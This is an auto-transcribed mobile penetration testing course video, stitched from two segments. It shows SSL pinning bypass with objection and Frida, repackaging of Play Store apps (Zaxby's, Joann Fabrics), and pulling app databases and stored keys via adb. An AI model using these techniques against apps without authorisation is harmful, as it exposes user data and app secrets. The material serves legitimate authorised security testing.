
445
00:22:09.600 --> 00:22:10.000
running.

446
00:22:16.450 --> 00:22:18.530
I'll turn my intercept off for Burp Suite

447
00:22:18.530 --> 00:22:19.490
for right now.

448
00:22:20.230 --> 00:22:22.250
I'm going to go open the Joann Fabrics

449
00:22:22.250 --> 00:22:22.570
app.

450
00:22:22.670 --> 00:22:24.070
Again, we're going to have to do exit

451
00:22:24.070 --> 00:22:27.750
here in objection and run objection explorer again

452
00:22:27.750 --> 00:22:29.110
to hook this application.

453
00:22:30.150 --> 00:22:31.090
And here we go.

454
00:22:31.190 --> 00:22:34.350
And now I'll do Android SSL pinning, disable.

455
00:22:38.860 --> 00:22:41.680
Okay, click skip actually.

456
00:22:42.560 --> 00:22:43.240
It's fine.

457
00:22:45.820 --> 00:22:47.060
Skip sign in for now.

458
00:22:47.060 --> 00:22:49.440
That's obviously something you want to test as

459
00:22:49.440 --> 00:22:50.500
part of the application.

460
00:22:51.420 --> 00:22:53.080
Make sure that my proxy is set up

461
00:22:53.080 --> 00:22:53.800
here for Burp.

462
00:22:53.920 --> 00:22:54.820
Yep, it is.

463
00:22:55.680 --> 00:22:57.480
See if we can actually intercept some of

464
00:22:57.480 --> 00:22:59.320
this traffic or if we currently are.

465
00:23:01.800 --> 00:23:02.860
Looks like we should be.

466
00:23:03.740 --> 00:23:07.280
Try to click some of these images or

467
00:23:07.280 --> 00:23:09.200
do a search to make sure our proxy

468
00:23:09.200 --> 00:23:10.160
is working properly.

469
00:23:17.400 --> 00:23:21.880
Yep, so we're able to see the application

470
00:23:21.880 --> 00:23:23.440
traffic here as well.

471
00:23:23.960 --> 00:23:26.200
So you can see everything that's sending there.

472
00:23:26.300 --> 00:23:28.160
I would obviously take time and look at

473
00:23:28.160 --> 00:23:30.040
every single one of those requests individually.

474
00:23:30.640 --> 00:23:33.060
Now the good benefit again about using this

475
00:23:33.060 --> 00:23:34.940
other emulator is that we'll be able to

476
00:23:34.940 --> 00:23:35.840
go to data here.

477
00:23:36.000 --> 00:23:38.000
Oops, let me turn Burp Suite proxy off.

478
00:23:39.460 --> 00:23:43.360
Let me go to data and then data

479
00:23:43.360 --> 00:23:45.540
and go down to wherever we find the

480
00:23:45.540 --> 00:23:47.000
Joann Fabrics application.

481
00:23:51.580 --> 00:23:54.020
So here it is, the fifth finger clients,

482
00:23:54.220 --> 00:23:54.480
Joann.

483
00:23:54.900 --> 00:23:56.580
Okay, and here we can actually see the

484
00:23:56.580 --> 00:23:57.820
application structure.

485
00:23:58.020 --> 00:23:59.380
So we have some files here.

486
00:23:59.740 --> 00:24:03.540
We have some flyout by sdkconfig.json. We

487
00:24:03.540 --> 00:24:04.680
want to look through this.

488
00:24:05.220 --> 00:24:07.680
Is there anything sensitive stored in here?

489
00:24:08.740 --> 00:24:10.780
Client IDs, things like this.

490
00:24:12.160 --> 00:24:14.600
I don't know what this qmuserjoann is.

491
00:24:14.720 --> 00:24:17.680
Looks like some kind of possible user ID

492
00:24:17.680 --> 00:24:18.000
there.

493
00:24:18.960 --> 00:24:20.920
Look at some of the libraries here.

494
00:24:20.980 --> 00:24:22.680
We're obviously going to see the Frida gadget

495
00:24:22.680 --> 00:24:24.960
that we injected into the application as well.

496
00:24:26.320 --> 00:24:28.640
Look for anything in the backups or shared

497
00:24:28.640 --> 00:24:29.580
preferences here.

498
00:24:29.940 --> 00:24:33.280
These things can also affect the application itself.

499
00:24:33.460 --> 00:24:35.120
So like for example, we can see this

500
00:24:35.120 --> 00:24:37.560
pushio underscore store dot xml.

501
00:24:37.940 --> 00:24:40.320
Maybe if we mess with this xml, we

502
00:24:40.320 --> 00:24:41.880
can mess with the actual application.

503
00:24:42.360 --> 00:24:44.860
Looks like there's also an API key stored

504
00:24:44.860 --> 00:24:47.260
in here for something related to pushio.

505
00:24:47.260 --> 00:24:50.060
And some kind of a registration key as

506
00:24:50.060 --> 00:24:50.380
well.

507
00:24:50.500 --> 00:24:52.720
So that might be some interesting things here.

508
00:24:52.800 --> 00:24:54.180
There's also a URL.

509
00:24:54.740 --> 00:24:56.280
So we can see now that a dynamic

510
00:24:56.280 --> 00:24:58.760
analysis, like when this application is running, it

511
00:24:58.760 --> 00:25:01.160
can actually have some sensitive data in here.

512
00:25:01.440 --> 00:25:03.940
Some kind of a configuration file there.

513
00:25:04.100 --> 00:25:06.560
We also found some things here like this

514
00:25:06.560 --> 00:25:07.520
sdkconfig.

515
00:25:07.700 --> 00:25:09.280
Let's look at databases here.

516
00:25:09.820 --> 00:25:11.520
Okay, and here you're going to see a

517
00:25:11.520 --> 00:25:13.780
variety of SQLite databases.

518
00:25:14.440 --> 00:25:18.060
So these ones that end in wall or

519
00:25:18.060 --> 00:25:20.860
smh or journal, these are kind of like

520
00:25:20.860 --> 00:25:24.860
backup databases or places where data is temporarily

521
00:25:24.860 --> 00:25:27.340
written to these databases and then written to

522
00:25:27.340 --> 00:25:29.720
the one that actually says the dot db

523
00:25:29.720 --> 00:25:30.300
at the end.

524
00:25:30.760 --> 00:25:32.300
So if we look at the app underscore

525
00:25:32.300 --> 00:25:35.020
db, I'm just going to open this as

526
00:25:35.020 --> 00:25:36.820
text to see what's in here.

527
00:25:37.960 --> 00:25:39.680
Might take a second to do this.

528
00:25:43.330 --> 00:25:44.510
See if I can get the file to

529
00:25:44.510 --> 00:25:44.890
open.

530
00:25:45.490 --> 00:25:47.990
But also something else you can do is

531
00:25:47.990 --> 00:25:51.110
that you can actually do a pull of

532
00:25:51.110 --> 00:25:52.590
these databases out of here.

533
00:25:52.790 --> 00:25:55.010
And a useful tool that you can use

534
00:25:55.010 --> 00:25:56.650
if you go onto Google and look for

535
00:25:56.650 --> 00:26:00.230
SQLite viewer, there's db browser for SQLite.

536
00:26:00.390 --> 00:26:02.810
And what you can actually do is when

537
00:26:02.810 --> 00:26:08.280
you're in Android Studio, you can do like

538
00:26:08.280 --> 00:26:09.260
an adb pull.

539
00:26:10.020 --> 00:26:12.140
And then you can provide the file path

540
00:26:12.140 --> 00:26:13.860
of one of these databases, right?

541
00:26:13.960 --> 00:26:17.800
So like if I wanted this pushomanager.db,

542
00:26:17.940 --> 00:26:19.600
I could copy the path out with a

543
00:26:19.600 --> 00:26:22.680
file manager here, paste this, and this is

544
00:26:22.680 --> 00:26:25.460
going to pull the database directly off of

545
00:26:25.460 --> 00:26:28.400
the emulator and onto my local machine.

546
00:26:29.020 --> 00:26:30.520
And so now I would be able to

547
00:26:30.520 --> 00:26:35.020
use my SQLite db browser and actually try

548
00:26:35.020 --> 00:26:37.080
to view what is in that database.

549
00:26:37.300 --> 00:26:38.940
So I'm going to click download here.

550
00:26:39.300 --> 00:26:41.260
I'm going to do the standard installer for

551
00:26:41.260 --> 00:26:42.600
Windows 64 bit.

552
00:26:43.400 --> 00:26:45.360
And it's going to download this MSI file.

553
00:26:45.560 --> 00:26:48.120
There's also a zip file here if you

554
00:26:48.120 --> 00:26:49.380
want to use a zip file.

555
00:26:50.020 --> 00:26:51.920
Go through the setup really quick.

556
00:26:52.000 --> 00:26:53.380
You just have to accept the terms and

557
00:26:53.380 --> 00:26:53.840
conditions.

558
00:26:54.540 --> 00:26:56.700
And I'm going to make a desktop icon.

559
00:26:57.740 --> 00:26:59.840
Pretty much you can accept the defaults out

560
00:26:59.840 --> 00:27:00.220
of here.

561
00:27:03.310 --> 00:27:06.250
There's also a db browser for SQLite for

562
00:27:06.250 --> 00:27:07.670
Mac OS as well.

563
00:27:07.850 --> 00:27:09.670
Now just take a second to install this

564
00:27:09.670 --> 00:27:12.390
file so that we can actually see the

565
00:27:12.390 --> 00:27:14.670
SQLite database and what might be contained within

566
00:27:14.670 --> 00:27:14.930
it.

567
00:27:18.290 --> 00:27:19.790
Okay, I'm going to click finish here.

568
00:27:34.170 --> 00:27:35.910
See if we can actually get this to

569
00:27:35.910 --> 00:27:36.270
run.

570
00:27:42.590 --> 00:27:44.970
Here it is, db browser for SQLite.

571
00:27:45.710 --> 00:27:47.190
And here is the tool.

572
00:27:49.170 --> 00:27:51.270
And all I'm going to do is do

573
00:27:51.270 --> 00:27:52.550
open database here.

574
00:27:52.590 --> 00:27:54.250
And now I'm going to go to where

575
00:27:54.250 --> 00:27:56.130
I downloaded that file to, which is in

576
00:27:56.130 --> 00:27:57.850
my documents apk folder.

577
00:27:58.330 --> 00:28:01.170
You can see the pushio-manager.db here.

578
00:28:02.070 --> 00:28:02.590
Okay.

579
00:28:03.110 --> 00:28:06.170
And here is basically the database.

580
00:28:06.730 --> 00:28:08.270
You can see the tables.

581
00:28:08.570 --> 00:28:10.630
And then you can click down here and

582
00:28:10.630 --> 00:28:13.190
see like what the columns would actually be.

583
00:28:13.330 --> 00:28:14.910
And it also tells you the types.

584
00:28:15.430 --> 00:28:17.070
You can also do like browse data.

585
00:28:17.190 --> 00:28:19.850
So if there's a particular table that you're

586
00:28:19.850 --> 00:28:21.330
interested in, you can see that you can

587
00:28:21.330 --> 00:28:23.190
browse through all the tables.

588
00:28:23.890 --> 00:28:25.850
Now, in some cases, when you actually find

589
00:28:25.850 --> 00:28:28.710
a SQLite database, it might be encrypted as

590
00:28:28.710 --> 00:28:28.990
well.

591
00:28:29.430 --> 00:28:31.030
So in addition to this, if you do

592
00:28:31.030 --> 00:28:35.210
find an encrypted SQLite database, you can also

593
00:28:35.210 --> 00:28:39.290
try to look through the source code and

594
00:28:39.290 --> 00:28:40.850
try to find the encryption key.

595
00:28:40.990 --> 00:28:43.750
In this case, this database is not encrypted.

596
00:28:44.250 --> 00:28:46.050
Let's see if we can pull another one

597
00:28:46.050 --> 00:28:47.490
off of the device as well.

598
00:28:48.040 --> 00:28:50.190
Go back to Android Studio here.

599
00:28:52.890 --> 00:28:55.170
We can try to do this appdb.

600
00:28:55.590 --> 00:28:58.910
So let's try and just replace this with

601
00:28:58.910 --> 00:29:00.430
app underscore db.

602
00:29:02.980 --> 00:29:05.420
And I'll go back to my SQLite database

603
00:29:05.420 --> 00:29:07.260
and open that database instead.

604
00:29:08.740 --> 00:29:10.740
I'll do all files here.

605
00:29:11.360 --> 00:29:13.060
I might need to rename this.

606
00:29:14.360 --> 00:29:16.720
Oh, looks like this database is actually empty.

607
00:29:17.360 --> 00:29:20.260
But maybe as we use the application, as

608
00:29:20.260 --> 00:29:22.520
we log in, as we save preferences, as

609
00:29:22.520 --> 00:29:24.560
we do stuff like that throughout the application,

610
00:29:24.560 --> 00:29:27.560
maybe this database actually will start filling up

611
00:29:27.560 --> 00:29:27.920
with things.

612
00:29:27.980 --> 00:29:29.500
We would never know that until we start

613
00:29:29.500 --> 00:29:31.560
like logging in, trying to buy stuff, and

614
00:29:31.560 --> 00:29:33.380
interacting with the application more.

615
00:29:33.840 --> 00:29:36.000
So that's something important to know when it

616
00:29:36.000 --> 00:29:39.960
comes to SQLite databases, that these journal files

617
00:29:39.960 --> 00:29:42.740
might hold some information.

618
00:29:43.380 --> 00:29:45.600
Also, if you try to open these as

619
00:29:45.600 --> 00:29:48.560
a text file in Android Studio, it often

620
00:29:48.560 --> 00:29:49.400
will not work.

621
00:29:49.760 --> 00:29:51.660
Another thing that you can do in addition

622
00:29:51.660 --> 00:29:53.820
to this, is you can do an adb

623
00:29:53.820 --> 00:29:56.020
shell, and then you can do a cd

624
00:29:56.020 --> 00:29:57.920
to that actual directory.

625
00:29:58.080 --> 00:29:58.800
So here we


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.970 --> 00:00:03.330
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Welcome back everyone to the last video in

2
00:00:03.330 --> 00:00:06.750
this mobile application penetration tester course for Android.

3
00:00:07.010 --> 00:00:08.830
In this video, I'm gonna do a bug

4
00:00:08.830 --> 00:00:12.590
bounty walkthrough of an app right off the

5
00:00:12.590 --> 00:00:13.050
Play Store.

6
00:00:13.770 --> 00:00:15.670
But first, before we do that, I do

7
00:00:15.670 --> 00:00:17.370
wanna talk about some things that I've run

8
00:00:17.370 --> 00:00:20.450
into in the recent past, and that is

9
00:00:20.450 --> 00:00:22.110
updating your tool set.

10
00:00:22.310 --> 00:00:24.890
So, I'd say once every six months to

11
00:00:24.890 --> 00:00:27.050
12 months, you probably want to run these

12
00:00:27.050 --> 00:00:28.070
couple of commands.

13
00:00:28.070 --> 00:00:32.110
So, one is pip3 instal dash dash upgrade

14
00:00:32.110 --> 00:00:33.430
objection.

15
00:00:34.270 --> 00:00:37.430
We want to keep these tools, objection, Frida,

16
00:00:37.670 --> 00:00:39.850
and the Frida tools all up to date.

17
00:00:40.170 --> 00:00:42.930
So, if you haven't done mobile pen testing

18
00:00:42.930 --> 00:00:45.190
for six months or a year, it's very

19
00:00:45.190 --> 00:00:47.630
likely that some of your tooling chain is

20
00:00:47.630 --> 00:00:49.790
actually out of date if you're having problems

21
00:00:49.790 --> 00:00:50.810
patching apps.

22
00:00:51.290 --> 00:00:53.690
So, you can do pip3 instal dash dash

23
00:00:53.690 --> 00:00:57.530
upgrade objection, press enter, it will go ahead

24
00:00:57.530 --> 00:00:58.770
and upgrade that package.

25
00:00:59.230 --> 00:01:01.630
Likewise, you wanna do the same thing with

26
00:01:01.630 --> 00:01:04.050
Frida and also Frida tools.

27
00:01:04.830 --> 00:01:06.850
Another thing that you wanna check up on

28
00:01:06.850 --> 00:01:09.090
occasionally is APK tool.

29
00:01:09.690 --> 00:01:11.890
So, if you do APK tool dash dash

30
00:01:11.890 --> 00:01:14.670
version, you can see I'm on 2.7

31
00:01:14.670 --> 00:01:17.250
.0, which is currently the most recent version.

32
00:01:17.690 --> 00:01:19.490
You wanna make sure that APK tool is

33
00:01:19.490 --> 00:01:20.610
up to date as well.

34
00:01:21.130 --> 00:01:23.190
You can sometimes run into issues on the

35
00:01:23.190 --> 00:01:25.170
Play Store if any part of your tool

36
00:01:25.170 --> 00:01:28.070
chain is not updated properly, you might not

37
00:01:28.070 --> 00:01:31.230
be able to patch applications successfully or even

38
00:01:31.230 --> 00:01:33.030
decompile them successfully.

39
00:01:33.950 --> 00:01:35.830
All right, so let's actually get into the

40
00:01:35.830 --> 00:01:37.890
bug bounty aspect of this video.

41
00:01:38.110 --> 00:01:40.330
I'm gonna go to the Google Play Store

42
00:01:40.330 --> 00:01:41.710
here, you'll see it's open.

43
00:01:42.390 --> 00:01:44.410
And we're just gonna search for an app

44
00:01:44.410 --> 00:01:45.630
called Zaxby's.

45
00:01:46.010 --> 00:01:49.470
And Zaxby's is a fried chicken restaurant in

46
00:01:49.470 --> 00:01:51.290
South Southern America.

47
00:01:51.290 --> 00:01:53.630
It's pretty popular here, a growing chain.

48
00:01:54.170 --> 00:01:55.810
You might not have access to this app

49
00:01:55.810 --> 00:01:57.010
if you're outside of the country.

50
00:01:57.450 --> 00:01:58.810
So, I recommend going out on the App

51
00:01:58.810 --> 00:02:00.530
Store and picking any app that you really

52
00:02:00.530 --> 00:02:01.010
want to.

53
00:02:01.490 --> 00:02:03.270
We have this just a few moments and

54
00:02:03.270 --> 00:02:06.070
it's going to actually instal the app to

55
00:02:06.070 --> 00:02:06.450
the phone.

56
00:02:09.130 --> 00:02:10.910
Now, while it's happening, on the left-hand

57
00:02:10.910 --> 00:02:12.970
side here, I'm gonna open up an ADB

58
00:02:12.970 --> 00:02:13.210
shell.

59
00:02:13.330 --> 00:02:14.970
So, we're all ready to go once the

60
00:02:14.970 --> 00:02:16.810
app is actually installed.

61
00:02:16.910 --> 00:02:18.210
So, I'm just gonna go ADB shell.

62
00:02:19.610 --> 00:02:21.490
Again, remember the point here is that we're

63
00:02:21.490 --> 00:02:24.350
going to be pulling the application off of

64
00:02:24.350 --> 00:02:24.770
the phone.

65
00:02:25.070 --> 00:02:26.950
So, we can look at it manually and

66
00:02:26.950 --> 00:02:28.890
we can inject it with objection to try

67
00:02:28.890 --> 00:02:30.770
to bypass SSL pinning.

68
00:02:31.210 --> 00:02:34.890
So, as this is installing, the command we're

69
00:02:34.890 --> 00:02:37.070
going to do is gonna be pm list

70
00:02:37.070 --> 00:02:38.030
packages, right?

71
00:02:38.470 --> 00:02:40.410
In this case, we're gonna go prep and

72
00:02:40.410 --> 00:02:42.130
we're gonna look for Zaxby's.

73
00:02:44.640 --> 00:02:47.340
Now, it's still installing, so just give that

74
00:02:47.340 --> 00:02:48.160
a few minutes.

75
00:02:48.720 --> 00:02:50.300
I might cut back to the video here

76
00:02:50.300 --> 00:02:52.140
to make sure it actually installed.

77
00:02:54.790 --> 00:02:55.930
All right, welcome back.

78
00:02:56.570 --> 00:02:58.670
And now, we're gonna pull the Zaxby's app

79
00:02:58.670 --> 00:02:59.630
off of our phone.

80
00:02:59.750 --> 00:03:01.070
So, over here on the left, I'm just

81
00:03:01.070 --> 00:03:03.650
gonna go ADB shell and we're gonna do

82
00:03:03.650 --> 00:03:05.650
a pm list packages.

83
00:03:06.050 --> 00:03:08.190
We're gonna prep for Zaxby's, right?

84
00:03:09.910 --> 00:03:11.810
And here we can see the path to

85
00:03:11.810 --> 00:03:12.430
Zaxby's.

86
00:03:12.470 --> 00:03:13.490
So, let me copy this.

87
00:03:14.330 --> 00:03:18.400
Now, we're gonna do a pm path and

88
00:03:18.400 --> 00:03:19.400
put that path in there.

89
00:03:19.560 --> 00:03:21.040
And here's all the paths.

90
00:03:21.320 --> 00:03:23.100
So, this is actually an interesting app.

91
00:03:23.100 --> 00:03:26.720
We have four different APKs associated as part

92
00:03:26.720 --> 00:03:27.140
of this.

93
00:03:28.060 --> 00:03:30.040
And we can actually deal with this in

94
00:03:30.040 --> 00:03:31.080
a variety of ways.

95
00:03:31.320 --> 00:03:33.220
So, on GitHub, there's a tool, I'll put

96
00:03:33.220 --> 00:03:35.940
a link in the comments, for a tool

97
00:03:35.940 --> 00:03:39.020
called Patch APK that can take these split

98
00:03:39.020 --> 00:03:41.320
APKs and merge it into one APK.

99
00:03:41.820 --> 00:03:43.560
But I'm also going to show a different

100
00:03:43.560 --> 00:03:45.540
method in this video where you can do

101
00:03:45.540 --> 00:03:48.400
everything by hand, basically.

102
00:03:48.620 --> 00:03:50.000
So, I'm gonna exit this now that we

103
00:03:50.000 --> 00:03:52.380
have our paths to the APKs.

104
00:03:53.960 --> 00:03:56.120
And if we do a do right here,

105
00:03:56.160 --> 00:03:58.400
you can see that I have all those

106
00:03:58.400 --> 00:04:00.520
pulled into my local directory here.

107
00:04:00.880 --> 00:04:03.300
But how I did this was, if we

108
00:04:03.300 --> 00:04:04.580
just copy this path, right?

109
00:04:05.260 --> 00:04:09.180
We can just do adb pull and paste

110
00:04:09.180 --> 00:04:10.160
the path in there.

111
00:04:11.040 --> 00:04:12.880
And if I do a directory listing now,

112
00:04:13.000 --> 00:04:15.240
you can see base.apk. So, what we

113
00:04:15.240 --> 00:04:17.560
would do here, I'll actually show you this,

114
00:04:18.060 --> 00:04:20.339
is we can pull each one of these

115
00:04:20.339 --> 00:04:21.980
off of the phone individually.

116
00:04:22.880 --> 00:04:24.060
So, I'm gonna go down.

117
00:04:25.440 --> 00:04:28.700
Again, I'm gonna do an adb pull and

118
00:04:28.700 --> 00:04:29.480
paste this.

119
00:04:30.440 --> 00:04:32.180
So, we're gonna pull each one of these

120
00:04:32.180 --> 00:04:34.640
APKs off of the phone because we're gonna

121
00:04:34.640 --> 00:04:36.360
need it to actually build the app.

122
00:04:36.520 --> 00:04:42.920
So, I'll grab this one, do adb pull.

123
00:04:47.190 --> 00:04:48.870
Okay, scroll up again.

124
00:04:50.850 --> 00:04:52.130
We only have two more to go with

125
00:04:52.130 --> 00:04:55.350
the x86 and the xHTTPI.

126
00:04:56.790 --> 00:05:00.470
So, I'll do adb pull, paste that in

127
00:05:00.470 --> 00:05:00.690
there.

128
00:05:01.910 --> 00:05:04.390
And then we have to grab the xHTTPI

129
00:05:04.390 --> 00:05:05.150
one as well.

130
00:05:08.700 --> 00:05:15.230
So, control C and go down and add

131
00:05:15.230 --> 00:05:16.550
an adb pull in the front here.

132
00:05:17.470 --> 00:05:19.530
Okay, so now we have all of the

133
00:05:19.530 --> 00:05:20.590
APKs, right?

134
00:05:20.950 --> 00:05:23.050
Now, if we wanted to analyse this locally,

135
00:05:23.450 --> 00:05:25.210
we can actually just open up this base

136
00:05:25.210 --> 00:05:27.530
.apk in JEDx GUI.

137
00:05:27.530 --> 00:05:29.010
I do actually have this pulled up on

138
00:05:29.010 --> 00:05:29.810
my other screen.

139
00:05:30.450 --> 00:05:32.870
Sorry for the crazy resolution here for a

140
00:05:32.870 --> 00:05:33.110
second.

141
00:05:33.950 --> 00:05:35.310
Let me get that fixed.

142
00:05:39.630 --> 00:05:40.730
Excellent, closed it out.

143
00:05:47.060 --> 00:05:49.300
So, I just had the base.apk open

144
00:05:49.300 --> 00:05:50.660
here in JEDx GUI.

145
00:05:51.760 --> 00:05:53.440
And here we can actually look through the

146
00:05:53.440 --> 00:05:54.740
source code of the app, right?

147
00:05:54.800 --> 00:05:56.540
Just like we've been doing throughout the course.

148
00:05:57.000 --> 00:05:58.980
There's nothing really that special here.

149
00:05:59.500 --> 00:06:02.580
We could look through the androidmanifest.xml. Again,

150
00:06:02.660 --> 00:06:07.260
looking for things such as security misconfigurations.

151
00:06:07.460 --> 00:06:09.120
We're looking to make sure the platform build

152
00:06:09.120 --> 00:06:10.820
is up to a recent version, right?

153
00:06:11.020 --> 00:06:13.680
Looking for anything that might be exported equals

154
00:06:13.680 --> 00:06:14.080
true.

155
00:06:14.260 --> 00:06:22.350
So, we could do exported equals true, right?

156
00:06:25.740 --> 00:06:29.140
Look through, find any exported activities throughout here.

157
00:06:29.820 --> 00:06:33.140
You can look for anything like password, whatever

158
00:06:33.140 --> 00:06:35.140
you want to in the manifest, right?

159
00:06:35.140 --> 00:06:38.100
You could look for HTTP, HTTPS.

160
00:06:38.340 --> 00:06:39.600
So, we can see there's a link here

161
00:06:39.600 --> 00:06:41.320
to play.google.com.

162
00:06:41.680 --> 00:06:43.620
You can also use this magic wand tool

163
00:06:43.620 --> 00:06:44.580
again, right?

164
00:06:44.900 --> 00:06:48.320
To look for specific strings when we're looking

165
00:06:48.320 --> 00:06:48.640
for.

166
00:06:48.740 --> 00:06:50.560
So, we're looking for a secret key or

167
00:06:50.560 --> 00:06:52.520
more URLs or anything like that.

168
00:06:52.780 --> 00:06:56.160
You can look for HTTP, HTTPS, et cetera,

169
00:06:56.580 --> 00:06:57.440
things like that.

170
00:06:57.740 --> 00:06:59.700
So, you want to look through the androidmanifest

171
00:06:59.700 --> 00:07:01.300
.xml for any vulnerabilities.

172
00:07:02.000 --> 00:07:03.500
You want to look through the app for

173
00:07:03.500 --> 00:07:06.460
any links to websites or places the app

174
00:07:06.460 --> 00:07:08.280
might be reaching out to to get a

175
00:07:08.280 --> 00:07:10.040
hint about what you might see during the

176
00:07:10.040 --> 00:07:11.000
dynamic analysis.

177
00:07:11.560 --> 00:07:12.840
This is going to take a few minutes

178
00:07:12.840 --> 00:07:14.720
to load up the little search bar here.

179
00:07:14.980 --> 00:07:16.560
So, I'm just going to cancel this out.

180
00:07:17.140 --> 00:07:18.620
But also, what you want to do, of

181
00:07:18.620 --> 00:07:21.400
course, is go to like resources, res, remember?

182
00:07:22.160 --> 00:07:26.180
You're going to go to values and look

183
00:07:26.180 --> 00:07:28.460
through things like the strings.xml, right?

184
00:07:28.480 --> 00:07:30.600
If you're looking for different keys for things,

185
00:07:31.000 --> 00:07:34.320
if you're looking for anything the app might

186
00:07:34.320 --> 00:07:35.940
be doing, just generally speaking.

187
00:07:36.620 --> 00:07:38.520
You can go back through bug bounty number

188
00:07:38.520 --> 00:07:40.120
one if you want to do some more

189
00:07:40.120 --> 00:07:40.500
detail.

190
00:07:40.900 --> 00:07:42.900
You can do more detail looking through this

191
00:07:42.900 --> 00:07:46.080
app itself, looking through the packages, looking through

192
00:07:46.080 --> 00:07:48.680
the strings for any secret keys, things like

193
00:07:48.680 --> 00:07:49.020
that.

194
00:07:50.140 --> 00:07:51.880
Again, I recommend that if you're going to

195
00:07:51.880 --> 00:07:53.260
look through an app, you definitely want to

196
00:07:53.260 --> 00:07:56.580
make sure they have a vulnerability remediation programme

197
00:07:56.580 --> 00:07:57.520
that you can report it to.

198
00:07:57.620 --> 00:07:59.240
I do not recommend going out and just

199
00:07:59.240 --> 00:08:00.800
hunting through random apps.

200
00:08:01.040 --> 00:08:02.780
In this case, I picked this one because

201
00:08:02.780 --> 00:08:03.900
I just like the restaurant.

202
00:08:04.780 --> 00:08:07.620
All right, so after we've done our static

203
00:08:07.620 --> 00:08:09.380
analysis, we need to move on to the

204
00:08:09.380 --> 00:08:10.580
dynamic analysis.

205
00:08:11.180 --> 00:08:13.700
I'm going to close out JEDxGUI here.

206
00:08:14.040 --> 00:08:15.760
And this one is a little bit challenging

207
00:08:15.760 --> 00:08:18.800
because we have all these split APKs.

208
00:08:18.900 --> 00:08:21.120
There's actually a way with Objection that we

209
00:08:21.120 --> 00:08:23.960
can actually fix this and instal all these

210
00:08:23.960 --> 00:08:25.300
APKs at once.

211
00:08:25.640 --> 00:08:26.920
So, what I'm going to do here is

212
00:08:26.920 --> 00:08:31.260
actually patch the base.apk. And so, just

213
00:08:31.260 --> 00:08:33.559
like we've done before in the course, I'm

214
00:08:33.559 --> 00:08:37.760
going to do Objection patch apk-s.

215
00:08:38.120 --> 00:08:40.260
And here I'm going to select base.apk.

216
00:08:40.600 --> 00:08:42.679
Now, in this case, because I've messed with

217
00:08:42.679 --> 00:08:44.320
this app a little bit before, I know

218
00:08:44.320 --> 00:08:46.560
I have to add in here an extra

219
00:08:46.560 --> 00:08:48.900
flag doing use-app2.

220
00:08:49.160 --> 00:08:50.440
And a lot of times you're going to

221
00:08:50.440 --> 00:08:52.800
see this in apps off the Play Store

222
00:08:52.800 --> 00:08:55.020
if they're in a split configuration like this

223
00:08:55.020 --> 00:08:57.300
or if they're supporting newer versions of the

224
00:08:57.300 --> 00:08:59.280
Android operating system, you have to use this

225
00:08:59.280 --> 00:09:03.460
use-app2 because this parses the Kotlin language

226
00:09:03.460 --> 00:09:05.000
pretty well and you don't have to do

227
00:09:05.000 --> 00:09:06.640
much else with Objection.

228
00:09:06.980 --> 00:09:09.220
So, all right, we have Objection patch apk

229
00:09:09.220 --> 00:09:13.640
-s base.apk-use-app2.

230
00:09:13.920 --> 00:09:15.240
Let me press Enter here.

231
00:09:15.760 --> 00:09:17.940
It's going to go ahead and, oops, I

232
00:09:17.940 --> 00:09:19.280
have a little misspelling here.

233
00:09:20.140 --> 00:09:21.660
So, we got patch-apk.

234
00:09:22.820 --> 00:09:24.580
So, it's going to pick up the architecture

235
00:09:24.580 --> 00:09:25.300
of our device.

236
00:09:25.480 --> 00:09:27.400
It's going to pull the latest Frida gadget

237
00:09:27.400 --> 00:09:28.620
off of the internet.

238
00:09:29.020 --> 00:09:31.620
It's going to start decompiling the apk.

239
00:09:31.840 --> 00:09:34.880
It's going to inject Objection into a class

240
00:09:34.880 --> 00:09:37.580
and we'll be able to try to hook

241
00:09:37.580 --> 00:09:38.440
in from there.

242
00:09:39.740 --> 00:09:41.820
So, let's give this just a second to

243
00:09:41.820 --> 00:09:45.080
run and we should see the apk successfully

244
00:09:45.080 --> 00:09:47.560
generate in just a few minutes.

245
00:09:48.900 --> 00:09:51.080
Okay, so here we can see that the

246
00:09:51.080 --> 00:09:54.180
app was actually signed successfully and we generated

247
00:09:54.180 --> 00:09:55.200
a new apk.

248
00:09:55.380 --> 00:09:57.200
So, let me do a directory listing here.

249
00:09:57.880 --> 00:10:00.100
You can see we have a base.objection

250
00:10:00.100 --> 00:10:02.420
.apk. I want to go off on a

251
00:10:02.420 --> 00:10:03.860
little tiny tangent here.

252
00:10:04.440 --> 00:10:06.400
So, a cool trick with Objection that you

253
00:10:06.400 --> 00:10:09.140
can use is also this option called dash

254
00:10:09.140 --> 00:10:09.460
key.

255
00:10:09.980 --> 00:10:12.160
So, if you're using Objection and you realise

256
00:10:12.160 --> 00:10:15.840
that the app is not successfully hooking when

257
00:10:15.840 --> 00:10:18.040
you want it to, you can actually specify

258
00:10:18.040 --> 00:10:19.320
a class here.

259
00:10:19.320 --> 00:10:23.460
So, for example, in the Zaxby's app, this

260
00:10:23.460 --> 00:10:26.200
actually patched two small e classes to com

261
00:10:26.200 --> 00:10:28.400
.zaxby's.mainactivity.small e.

262
00:10:28.520 --> 00:10:30.500
What this would look like actually as a

263
00:10:30.500 --> 00:10:32.700
class name would be something along the lines

264
00:10:32.700 --> 00:10:38.060
of com.zaxby's.mainactivity. And in this case,

265
00:10:38.120 --> 00:10:40.500
we are actually going to have success with

266
00:10:40.500 --> 00:10:42.060
this main activity because it's just the main

267
00:10:42.060 --> 00:10:43.280
landing page of the app.

268
00:10:43.540 --> 00:10:44.980
I want you to know that you can

269
00:10:44.980 --> 00:10:47.300
specify any activity that you want.

270
00:10:47.300 --> 00:10:50.100
So, say, for example, the app pulls up

271
00:10:50.100 --> 00:10:52.420
a tutorial screen as soon as it opens.

272
00:10:52.460 --> 00:10:55.340
Maybe you want to specify that tutorial activity

273
00:10:55.340 --> 00:10:57.780
as where you want Objection to be.

274
00:10:58.040 --> 00:10:59.920
So, you can use this dash key option

275
00:10:59.920 --> 00:11:02.760
to customise where the app is going to

276
00:11:02.760 --> 00:11:05.500
inject Objection, where you can actually hook the

277
00:11:05.500 --> 00:11:05.760
app.

278
00:11:05.960 --> 00:11:08.020
This can actually help you to bypass certain

279
00:11:08.020 --> 00:11:08.620
things, right?

280
00:11:08.680 --> 00:11:11.720
So, if a application goes to a web

281
00:11:11.720 --> 00:11:13.740
view to log in and comes back to

282
00:11:13.740 --> 00:11:16.540
the app, maybe you want to inject Objection

283
00:11:16.540 --> 00:11:18.180
